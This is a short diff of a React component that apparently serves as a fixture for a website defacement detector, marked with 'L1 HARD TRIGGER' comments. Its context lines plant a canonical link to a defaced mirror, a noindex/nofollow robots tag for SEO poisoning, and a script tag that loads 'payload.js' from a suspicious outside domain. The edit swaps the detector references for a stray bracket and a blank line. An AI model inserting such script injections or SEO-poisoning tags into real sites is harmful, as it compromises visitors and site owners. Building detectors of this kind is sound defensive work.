@@ -16,14 +16,14 @@ const MainContent = () => {
       {/* 
           L1 HARD TRIGGER: Meta Tag Canonical Change 
           L1 HARD TRIGGER: Meta Tag Robots Change (SEO Poisoning)
-          Logic: detector/layers/l1_structural.py (Line 362)
+  )
       */}
       <link rel="canonical" href="https://defaced-mirror.site/compromised" />
       <meta name="robots" content="noindex, nofollow" />
 
       {/* 
           L1 HARD TRIGGER: Script Injection (New Domain)
-          Logic: detector/layers/l1_structural.py (Line 337)
+         
       */}
       <script src="https://malicious-cdn.ru/payload.js" />
 
